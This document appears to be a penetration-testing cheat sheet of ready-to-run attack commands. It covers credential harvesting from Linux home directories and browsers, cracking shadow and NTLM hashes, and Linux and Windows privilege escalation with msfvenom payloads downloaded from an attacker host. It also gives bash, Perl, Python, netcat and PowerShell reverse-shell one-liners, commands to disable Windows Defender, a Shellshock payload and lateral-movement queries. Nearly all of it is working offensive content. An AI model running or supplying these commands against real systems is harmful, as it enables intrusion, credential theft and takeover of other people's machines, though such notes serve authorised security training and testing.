| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`| Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`| Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory. |
| `tail -n5 /home/*/.bash*`| Uses Linux-based tail command to search the through bash history files and output the last 5 lines. |
| `python3 mimipenguin.py` | Runs Mimipenguin.py using python3.|
| `bash mimipenguin.sh`| Runs Mimipenguin.sh using bash. |
| `python2.7 lazagne.py all`| Runs Lazagne.py with all modules using python2.7|
| `ls -l .mozilla/firefox/ \| grep default `| Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep. |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .` | Uses Linux-based command cat to search for credentials stored by Firefox in JSON. |
| `python3.9 firefox_decrypt.py`| Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9. |
| `python3 lazagne.py browsers`| Runs Lazagne.py browsers module using Python 3. |
| | |
| **Passwd, Shadow & Opasswd** | |
| Cracking Linux Credentials | Once we have collected some hashes, we can try to crack them in different ways to get the passwords in cleartext. |
| `sudo cp /etc/passwd /tmp/passwd.bak` | Moving the passwd file |
| `sudo cp /etc/shadow /tmp/shadow.bak` | Moving the shadow file |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Unshadow |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Hashcat - Cracking Unshadowed Hashes |
| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt` | Hashcat - Cracking MD5 Hashes |

_____

## PASSWORD CRACKING

### Online

```
Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
https://hashes.com/en/decrypt/hash
```
### Hydra
```
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt x.x.x.x http-post-form "LOGINPAGE:username=admin&password=^PASS^:Invalid Password!"
#Change http-post-form to http-get-form for get or post 
# -l = User
```
### Hashcat

#### Linux password

```
hashcat -m 1800 -a 0 hash.txt rockyou.txt
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

#### Windows password

```
hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

#### Others

```
hashcat --example-hashes | grep -i '<BEGINNING_OF_HASH>'
```

#### Rules

```
https://github.com/NotSoSecure/password_cracking_rules
```

### John

```
john --wordlist=<PASSWORDS_LIST> hash.txt
```

| **Command**| **Description**|
|-|-|
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` | Uses Hashcat to crack NTLM hashes using a specified wordlist. |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show` | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output. |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking. |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
| ` hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`           | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file. |
| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked. |
| `ssh2john.pl SSH.private > ssh.hash`         | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash. |
| `john ssh.hash --show`                                       | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal. |
| `office2john.py Protected.docx > protected-docx.hash`        | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash. |
| `john --wordlist=rockyou.txt protected-docx.hash`            | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash. |
| `pdf2john.pl PDF.pdf > pdf.hash`                       | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked. |
| `john --wordlist=rockyou.txt pdf.hash`                       | Runs John in conjunction with a wordlist to crack a pdf hash. |
| `zip2john ZIP.zip > zip.hash`                                | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash. |
| `john --wordlist=rockyou.txt zip.hash`                       | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash. |
| `bitlocker2john -i Backup.vhd > backup.hashes`               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |
| `file GZIP.gzip`   | Uses the Linux-based file tool to gather file format information. |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive. |

------

## PIVOTING

### Sshuttle

```
sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR
```

### Proxychains

```
ssh -f -N -D 9050 <USER>@<IP>
proxychains <COMMAND>
```

### Interesting link

```
https://artkond.com/2017/03/23/pivoting-guide/
```

------

## PRIVILE ESCALATION

### Linux

#### Enumeration scripts

``` 
bash LinEnum.sh
bash lse.sh -l 1
bash linpeas.sh
python linuxprivchecker.py
./unix-privesc-check standard
```

## Enum users using enum4linux
replace 'hostname' with target . Creates file containing found usernames

```
(echo; enum4linux -U hostname|grep user:|cut -d\[ -f2|cut -d\] -f1) >
/home/kali/Desktop/users.txt
```

## LinPEAS
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

```
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors

# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```
-------
#### Vulnerability scan

```
perl les2.pl
bash les.sh
```

#### Suid checker

```
python suid3num.py

https://gtfobins.github.io/
```

#### Methodology to follow

```
https://guif.re/linuxeop
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
```

```
sudo -l
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000- default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)
```

### Windows

#### Enumeration scripts

##### General scans

```
winPEAS.exe
windows-privesc-check2.exe
Seatbelt.exe -group=all
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
Powerless.bat
winPEAS.bat
```

##### Search for CVE

```
systeminfo > systeminfo.txt
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt

systeminfo > systeminfo.txt
wmic qfe > qfe.txt
python wes.py -u
python wes.py systeminfo.txt qfe.txt

powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
```

##### Post exploitation

```
lazagne.exe all
SharpWeb.exe
mimikatz.exe
```

#### JuicyPotato (SeImpersonate or SeAssignPrimaryToken)

```
If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>

# CLSID
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
```

#### Methodology to follow

```
https://guif.re/windowseop
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
http://www.fuzzysecurity.com/tutorials/16.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
```

#### Autorun

##### Detection

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for modifiable registry autoruns and configs...

Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
```

or

```
winPEAS.exe

[+] Autorun Applications(T1010)
    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
cd C:\Program Files\Autorun Program\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.
```

#### AlwaysInstallElevated

##### Detection

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI
```

or

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

If both values are equal to 1 then it's vulnerable.
```

or

```
winPEAS.exe

[+] Checking AlwaysInstallElevated(T1012)

  AlwaysInstallElevated set to 1 in HKLM!
  AlwaysInstallElevated set to 1 in HKCU!
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
msiexec /quiet /qn /i C:\Temp\program.msi
```

#### Executable Files

##### Detection

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking service executable and argument permissions...

ServiceName                     : filepermsvc
Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True
```

or

```
winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
	File Permissions: Everyone [AllAccess]
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```

#### Startup applications

##### Detection

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.
```

#### Weak service permission 

##### Detection

```
# Find all services authenticated users have modify access onto
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

if SERVICE_ALL_ACCESS then vulnerable

# Find all weak folder permissions per drive.
accesschk.exe /accepteula -uwdqs Users c:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Find all weak file permissions per drive.
accesschk.exe /accepteula -uwqs Users c:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
```

or

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking service permissions...

ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
CanRestart    : True
```

or

```
winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
	YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

[+] Modifiable Services(T1007)
	LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
	daclsvc: WriteData/CreateFiles
```

##### Exploitation

```
# Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
sc start <SERVICENAME>
or 
net start <SERVICENAME>
```

#### Unquoted service paths

##### Detection

```
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for unquoted service paths...

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
CanRestart     : True

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
CanRestart     : True
```

or

```
winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
```

##### Exploitation

```
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
cd "C:\Program Files\Unquoted Path Service\"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
sc start unquotedsvc
```

#### Hot potato

##### Exploitation

```
# Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', '.\Tater.ps1.exe')
powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
```

#### CVE

```
# Already compiled exploit
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits
```

##### Windows XP

|      CVE      | Description        |
| :-----------: | :----------------------------------------------------------- |
| CVE-2002-1214 | ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS |
| CVE-2003-0352 | ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service |
| CVE-2003-0533 | MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service |
| CVE-2003-0719 | ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow |
| CVE-2003-0812 | ms03_049_netapi - exploits a stack buffer overflow in the NetApi32 |
| CVE-2003-0818 | ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library |
| CVE-2003-0822 | ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051 |
| CVE-2004-0206 | ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service |
| CVE-2010-3138 | EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse |
| CVE-2010-3147 | EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse |
| CVE-2010-3970 | ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution |
| CVE-2011-1345 | Internet Explorer does not properly handle objects in memory - allows remote execution of code via object |
| CVE-2011-5046 | EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution |
| CVE-2012-4349 | Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root |

##### Windows 7

|      CVE      | Description        |
| :-----------: | :----------------------------------------------------------- |
| CVE-2010-0232 | ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit |
| CVE-2010-2568 | ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload |
| CVE-2010-2744 | EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation |
| CVE-2010-3227 | EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution |
| CVE-2014-4113 | ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution |
| CVE-2014-4114 | ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution |
| CVE-2015-0016 | ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer's sandbox - code execution |
| CVE-2018-8494 | remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input |

##### Windows 8

|      CVE      | Description        |
| :-----------: | ------------------------------------------------------------ |
| CVE-2013-0008 | ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation |
| CVE-2013-1300 | ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation |
| CVE-2013-3660 | ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption |
| CVE-2013-3918 | ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution |
| CVE-2013-7331 | ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine's filenames |
| CVE-2014-6324 | ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation |
| CVE-2014-6332 | ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability |
| CVE-2014-6352 | ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution |
| CVE-2015-0002 | ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation |

##### Windows 10

|      CVE      | Description        |
| :-----------: | ------------------------------------------------------------ |
| CVE-2015-0057 | exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine |
| CVE-2015-1769 | MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege |
| CVE-2015-2426 | ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver |
| CVE-2015-2479 | MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege |
| CVE-2015-2513 | MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution |
| CVE-2015-2423 | MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure |
| CVE-2015-2431 | MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution |
| CVE-2015-2441 | MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution |

##### Windows Server 2003

|      CVE      | Description        |
| :-----------: | ------------------------------------------------------------ |
| CVE-2008-4250 | ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX |
| CVE-2017-8487 | allows an attacker to execute code when a victim opens a specially crafted file - remote code execution |

------

## PROOFS

### Linux

```
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
```

### Windows

```
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```

------

# Shells & Payloads

### Anatomy of a Shell

|**Commands** |**Description**|
|---|---|
| `ps` | Shell Validation From 'ps' |
| `env` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use |

### Bind Shells

|**Commands** |**Description**|
|---|---|
| `nc -lvnp 7777` | Server - Target starting Netcat listener |
| `nc -nv 10.129.41.200 7777` | Client - Attack box connecting to target |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Server - Binding a Bash shell to the TCP session |
| `nc -nv 10.129.41.200 7777` | Client - Connecting to bind shell on target |

### Reverse Shells

|**Commands** |**Description**|
|---|---|
| `sudo nc -lvnp 443` | Server (attack box) |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | Client (target) -CMD |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Disabling anti virus/ Disabling AV -PWSH |

### Spawning Interactive Shells

|**Commands** |**Description**|
|---|---|
| `/bin/sh -i` | This command will execute the shell interpreter specified in the path in interactive mode (-i). | 
| `perl —e 'exec "/bin/sh";'` | If the programming language Perl is present on the system, these commands will execute the shell interpreter specified. |
| `perl: exec "/bin/sh";` | Perl |
| `ruby: exec "/bin/sh"` | If the programming language Ruby is present on the system, this command will execute the shell interpreter specified: |
| `Lua: os.execute('/bin/sh')` | If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command |
| `awk 'BEGIN {system("/bin/sh")}'` | This is shown in the short awk script, It can also be used to spawn an interactive shell. | 
| `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | find can also be used to execute applications and invoke a shell interpreter. |
| `find . -exec /bin/sh \; -quit` | This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained. |
| `vim -c ':!/bin/sh'` | We can set the shell interpreter language from within the popular command-line-based text-editor VIM. |
| `ls -la <path/to/fileorbinary>` | We can also attempt to run this command to check what sudo permissions the account we landed on has |
| `sudo -l` | The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc 10.10.14.12 7777 > /tmp/f` | Netcat/Bash Reverse Shell One-liner |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | Powershell One-liner |

### Laudanum, One Webshell To Rule Them All 

|**Commands** |**Description**|
|---|---|
| `cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx` | Move a Copy for Modification Laudanum Webshell |

### Antak Webshell

|**Commands** |**Description**|
|---|---|
| `cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx` | Move a Copy for Modification ANTAK WEBSHELL |

### Amazing tool for shell generation

```
# Download
git clone https://github.com/ShutdownRepo/shellerator

# Install requirements
pip3 install --user -r requirements.txt

# Executable from anywhere
sudo cp shellrator.py /bin/shellrator
```

### Bash

```
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

### Perl

```
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Netcat

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

### More reverse shell

```
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

### Interactive shell

```
# Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Bash
echo os.system('/bin/bash')

# Sh
/bin/bash -i

# Perl
perl -e 'exec "/bin/bash"'

# Ruby
exec "/bin/bash"

# Lua
os.execute('/bin/bash')
```

### Adjust Interactive shell

```
stty size # Find your terminal size -> 50 235
Ctrl-Z
stty raw -echo  // Disable shell echo
fg
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
stty rows 50 columns 235
```

------

## SHELLSHOCK

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
```

------

## USEFUL LINUX COMMANDS

### Find a file

```
locate <FILE>
find / -name "<FILE>"
```

### Active connection

```
netstat -lntp
```

### List all SUID files

```
find / -perm -4000 2>/dev/null
```

### Determine the current version of Linux

```
 cat /etc/issue
```

### Determine more information about the environment

```
uname -a
```

### List processes running

```
ps -faux
```

### List the allowed (and forbidden) commands for the invoking use

```
sudo -l
```

------

## USEFUL WINDOWS COMMANDS
https://wadcoms.github.io/ - Interactive cheatsheet - Windows/ Active directory

```
net config Workstation
systeminfo
net users

ipconfig /all
netstat -ano

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable windows defender
sc stop WinDefend

# Bypass restriction
powershell -nop -ep bypass

# List hidden files
dir /a

# Find a file
dir /b/s "<FILE>"
```

## Lateral Movement 

### Powerview
```
# Find existing local admin access for user (noisy 🚩)
Find-LocalAdminAccess

# Hunt for sessions of interesting users on machines where you have access (also noisy 🚩)
Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }

# Look for kerberoastable users
Get-DomainUser -SPN | select name,serviceprincipalname

# Look for AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select name

# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised
## Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet
## Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)
